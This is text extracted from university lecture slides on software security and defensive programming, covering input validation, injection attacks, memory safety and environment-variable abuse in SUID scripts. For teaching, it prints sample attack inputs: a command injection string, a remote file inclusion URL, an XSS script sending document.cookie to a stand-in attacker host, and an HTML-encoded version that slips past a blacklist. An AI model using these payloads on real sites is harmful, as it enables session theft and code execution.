{"path":"System Security/Lecture 9 Software-Security.pdf","text":"Software Security System Security (CM0625, CM0631) 2024-25 Universit√† Ca‚Äô Foscari Venezia Riccardo Focardi www.unive.it/data/persone/5590470 secgroup.dais.unive.it The best defense against software vulnerabilities is to prevent them occurring Software security refers to writing safe code and correctly handle program I/O so to prevent vulnerabilities Introduction 2 Prevention: improved methods for specifying and building software Detection: better and more eÔ¨Écient testing techniques Mitigation: more resilient architectures, defence in depth Introduction NISTIR 8151 ‚ÄúDramatically Reducing Software Vulnerabilities‚Äù 3 CWE TOP Software Errors 2019 ( link) ‚óè Improper Restriction of Operations within the Bounds of a Memory Buffer ‚óè Improper Neutralization of Input in Web Page Generation ('Cross-site Scripting') ‚óè Improper Input Validation ‚óè Information Exposure ‚óè Improper Neutralization of Special Elements in SQL query ('SQL Injection') ‚óè Use After Free ‚óè Integer OverÔ¨Çow or Wraparound ‚óè Cross-Site Request Forgery (CSRF) ‚óè Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') ‚óè Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') ‚óè Improper Authentication ‚óè NULL Pointer Dereference ‚óè Incorrect Permission Assignment for Critical Resource ‚óè Unrestricted Upload of File with Dangerous Type ‚óè Use of Hard-coded Credentials ‚óè Uncontrolled Resource Consumption ‚óè Deserialization of Untrusted Data 4 Defensive (secure) programming DeÔ¨Ånition: designing and implementing software so it continues to function even when under attack Software should detect erroneous conditions resulting from attack, and ‚óè continue executing safely, or ‚óè fail gracefully Key rule: never assume anything. Check all assumptions and handle any possible error states Vulnerabilities are often triggered by inputs that differ dramatically from what is usually expected ‚áí unlikely to be identiÔ¨Åed by common testing approaches 5 Abstract view of a program Figure from Lawrie Brown, William Stallings. Computer Security: Principles and Practice, 4/E, Pearson. 6 Challenges in defensive programming Programmers focus on steps for success rather than considering all possible points of failures Programmers make assumptions on input and environment that should be validated before processing Security has a cost: hardly achieved if not a design goal from the very beginning Defensive programming requires awareness of: ‚óè consequences of failures ‚óè attacker techniques ‚óè vulnerabilities can be triggered by highly unusual input ‚óè how failures occur and how to prevent them ‚áí increasingly a key design goal 7 Defensive programming 8 1. Handling program input 2. Writing safe code 3. Handling interaction 4. Handling output Input validity and interpretation Assuming input validity is very problematic Example: Heartbleed attack on OpenSSL. The program did not check the amount of requested data against the available ones, leading to a buffer over-read vulnerability Input interpretation is another important source of vulnerabilities Charset confusion is a source of vulnerability (e.g. bypassing blacklisting by alternate encoding) Type confusion also leads to attacks (e.g. code injection, integer overÔ¨Çow) 9 Injection attacks DeÔ¨Ånition: Attacker injects a malicious payload so to affect the Ô¨Çow of execution of the program Typical in scripting languages that pass input to other ‚Äúhelper‚Äù programs and then process their outputs Example 1 : SQL injections Example 2 : perl CGI script displaying user information through UNIX Ô¨Ånger #!/usr/bin/perl use CGI; use CGI::Carp qw(fatalsToBrowser); $q = new CGI; # create query object # display HTML header print $q->header, $q->start_html('Finger User'), $q->h1('Finger User'); print \"<pre>\"; # get name of user and display their finger details $user = $q->param(\"user\"); print `/usr/bin/finger -sh $user`; # display HTML footer print \"</pre>\"; print $q->end_html; 10 Command injection example Expected behaviour: when we pass username focardi the script displays the output of /usr/bin/finger -sh focardi Finger User Login Name TTY Idle Login Time Where focardi Riccardo Focardi *con 2d Mon 08:40 Injection: attacker can inject commands by separating them through ‚Äú;‚Äù as in username focardi; echo Attack!; ... Finger User Login Name TTY Idle Login Time Where focardi Riccardo Focardi *con 2d Mon 08:40 Attack! 11 Command injection example, Ô¨Åxed Command injection is an input interpretation problem Program interprets input as a username but instead the attacker is appending commands (that are executed with the server privileges) Possible Ô¨Åx: whitelisting the username through a regular expression checking that it only contains alphanumeric characters # get name of user and display their finger details $user = $q->param(\"user\"); print `/usr/bin/finger -sh $user`; is replaced by # get name of user and display their finger details $user = $q->param(\"user\"); die \"The specified user contains illegal characters!\" unless ($user =~ /^\\w+$/); print `/usr/bin/finger -sh $user`; 12 Code injection Code injection is another form of input interpretation problem Attacker injects code that is executed with the program privileges Example 1 : shellcodes Example 2 : Ô¨Åle inclusion in PHP scripts Suppose we load a page that is passed as parameter: https://foo.com/index.php?p=about.html PHP code: <?php if (isset($_GET[\"p\"])) { include($_GET[\"p\"]); } else { include(\"home.html\"); } ?> 13 File inclusion example Expected behaviour: include a selected content (e.g. from a menu) into a part of the web page Attack: When option allow_url_include is set on the server conÔ¨Åguration, the attacker can inject a URL in order to include arbitrary code https://foo.com/index.php?p=http://hacker.web.site/hack.txt The PHP code at http://hacker.web.site/hack.txt is included and evaluated In fact, http://hacker.web.site/hack.txt can contain arbitrary code 14 Cross-site scripting (XSS) For security reasons, browsers limit script access to pages that belong to the same site ‚áí content from one site is equally trusted and permitted to interact with other content from the same site XSS is a code injection attack that bypasses this security mechanism Idea: the attacker injects a script (e.g. JavaScript) into a web application in order to attack other users When a user access the page, the script is executed in the context of the honest site with ‚Äúfull privileges‚Äù Example: a comment like Thanks for this information, it‚Äôs great! <script> document.location='http://hacker.web.site/cookie .cgi?'+document.cookie </script> 15 Validating input syntax Whitelisting: compare input data against what is wanted Example: username is a sequence of alphanumeric characters die \"The specified user contains illegal characters!\" unless ($user =~ /^\\w+$/); üëç hard to bypass if whitelisting is strict enough Blacklisting: compare input data with know dangerous values Example: disallow/escape special characters such as ‚Äú;‚Äô...‚Äù $query = \"SELECT * FROM suppliers WHERE name = '\" . mysql_real_escape_string($name) . \"';\"; üëécan be bypassed, e.g., through encodings (mysql_real_escape_string is in fact deprecated) 16 Example: bypassing blacklisting We remove <script> tags in order to prevent XSS attacks Thanks for this information, it‚Äôs great! <script> document.location='http://hacker.web.site/cookie .cgi?'+document.cookie </script> becomes Thanks for this information, it‚Äôs great! document.location='http://hacker.web.site/cookie .cgi?'+document.cookie Attacker can (HTML) encode the comment as follows: Thanks for this information, its great! &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62; &#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116; &#46;&#108;&#111;&#99;&#97;&#116;&#105;&#111; &#110;&#61;&#39;&#104;&#116;&#116;&#112;&#58; &#47;&#47;&#104;&#97;&#99;&#107;&#101;&#114; &#101;&#47;&#99;&#111;&#111;&#107;&#105;&#101; ... Similar problem with Unicode (multiple representations of the same character) 17 Defensive programming 18 1. Handling program input 2. Writing safe code 3. Handling interaction 4. Handling output Correct algorithm implementation Buggy implementations might break security Example 1 : poor random number generation in early Netscape browser allowed for breaking session keys Example 2 : a similar problem in TCP sessions allowed for session hijacking Example 3 : debug/test code in sendmail was used by Morris worm to bypass security mechanisms and propagate Example 4 : early implementation of JVM had buggy security checks for remotely sourced code. An attacker could execute remote code from a web page as trusted, local one 19 Correct interpretation of data Data should be interpreted consistently to prevent inappropriate manipulation, leading to Ô¨Çaws Strongly typed languages ensures this is the case Loosely typed languages such as C, allows for liberal casting leading to incorrect manipulation of pointers, esp. in complex data structures These bugs might be exploited to crash the program or subvert execution Fixes: ‚óè use strongly typed programming languages, when possible ‚óè when using loosely typed languages, pay particular attention to cast and pointer manipulation 20 Correct use of memory Programs allocate memory on the heap. Memory should be released when the tasks have been performed Memory leak: Incorrect use of memory might steadily increase memory allocation, exhausting it ‚áí An attacker might exploit this to trigger a DoS attack Languages like C leave to the programmers the responsibility of memory management, and are subject to memory leaks Languages such as C++ and Java manage memory allocation automatically üëç more reliable programs üëéoverhead 21 Defensive programming 22 1. Handling program input 2. Writing safe code 3. Handling interaction 4. Handling output Environment variables Environment variables are a collection of string values inherited by each process from its parent that can affect the way a running process behaves Examples (Unix): ‚óè PATH directories for commands ‚óè IFS separators of words ‚óè LD_LIBRARY_PATH directories for dynamically loadable libs Scenario: a local user attempting to subvert a program that grants administrator privileges Example: ISP script that takes the identity of some user, strips domain speciÔ¨Åcation, and retrieves the mapping to the IP address #!/bin/bash user=`echo $1 |sed 's/@.*$//'` grep $user /var/local/accounts/ipaddrs 23 Example (ctd.) The script needs to access /var/local/accounts/ipaddrs and is set SUID root permission Note: the script uses sed and grep that are in /usr/bin Attacker include in PATH a directory under her control with malicious sed and grep implementations ‚áí code executed with root privileges Fix? #!/bin/bash PATH=\"/sbin:/bin:/usr/sbin:/usr/bin\" export PATH user=`echo $1 |sed 's/@.*$//'` grep $user /var/local/accounts/ipaddrs Attacker includes ‚Äú=‚Äù in IFS and path to malicious PATH program in PATH PATH=\"/sbin:/bin:/usr/sbin:/usr/bin\" executes PATH with param \"/sbin:/bin:/usr/sbin:/usr/bin\" 24 Secure scripts and programs? It is very hard to prevent previous attacks and write secure shell scripts Fix 1 : SUID on shell scripts is ignored in recent Unix systems Fix 2: use a wrapper compiled program that sets appropriate user and environment variables before invoking the actual script Example: Apache suEXEC Similar attack on programs by making LD_LIBRARY_PATH point to malicious libraries Fix: in modern systems LD_LIBRARY_PATH is ignored in SUID programs. It is necessary to specify the path at compile time Note: programs using custom variables should always regard them as untrusted input 25 Defensive programming 28 1. Handling program input 2. Writing safe code 3. Handling interaction 4. Handling output Output validity and interpretation As for input, output should be validated and correctly interpreted ‚óè Input is checked before it is used or stored ‚óè Output is checked before it is displayed Note: output might be based on third party data (es. database) that was not necessarily Ô¨Åltered Solution ‚óè blacklisting dangerous content (es. HTML tags) ‚óè if possible, whitelist the output As for input, blacklisting is tricky and requires to pay attention to encoding that might bypass the Ô¨Åltering 29","libVersion":"0.3.2","langs":""}